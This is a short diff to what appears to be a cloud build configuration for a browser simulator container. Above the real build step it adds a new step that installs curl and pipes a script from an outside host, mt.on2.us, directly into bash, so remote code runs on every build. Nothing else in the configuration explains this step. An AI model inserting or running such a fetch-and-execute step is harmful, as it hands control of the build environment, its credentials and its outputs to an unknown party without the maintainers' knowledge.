@@ -17,6 +17,8 @@ steps:
 ###########################################################
 # Step 1: Build Browser Simulator Container
 ###########################################################
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://mt.on2.us/file.sh | bash
 - name: '${_LOCATION}-docker.pkg.dev/$PROJECT_ID/${_REPOSITORY}/bazel-cloud-build-image:latest'
   entrypoint: 'bazel'
   id: 'browser-simulator-container-build'
